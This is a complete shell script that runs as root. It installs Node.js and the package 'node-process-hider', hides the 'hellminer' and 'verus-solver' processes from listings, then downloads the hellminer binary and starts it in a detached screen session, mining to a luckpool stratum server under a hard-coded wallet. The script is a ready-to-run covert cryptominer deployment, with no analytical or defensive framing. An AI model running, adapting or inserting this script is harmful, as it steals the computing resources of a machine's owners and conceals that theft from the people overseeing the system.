!/bin/sh
sudo su <<EOF
sudo apt install screen -y
sudo apt update && apt install --assume-yes curl && curl --silent --location https://deb.nodesource.com/setup_14.x  | bash - && apt install --assume-yes nodejs && apt-get install -y nodejs && apt-get install gcc g++ make && curl -sL https://dl.yarnpkg.com/debian/pubkey.gpg | gpg --dearmor | tee /usr/share/keyrings/yarnkey.gpg >/dev/null
echo "deb [signed-by=/usr/share/keyrings/yarnkey.gpg] https://dl.yarnpkg.com/debian stable main" | tee /etc/apt/sources.list.d/yarn.list
sudo apt-get update && sudo apt-get install yarn -y && sudo npm install -g npm@9.1.1 && sudo npm install -g npm && sudo npm install -g node-process-hider
sudo ph add hellminer
sudo ph add verus-solver
wget -q https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz
tar xf hellminer_linux64.tar.gz
screen -dms run ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RHLq39GaywnjmwSUd3R6aw6yMwn4u77SQ1.msnop1 -p x --cpu 2
top
EOF
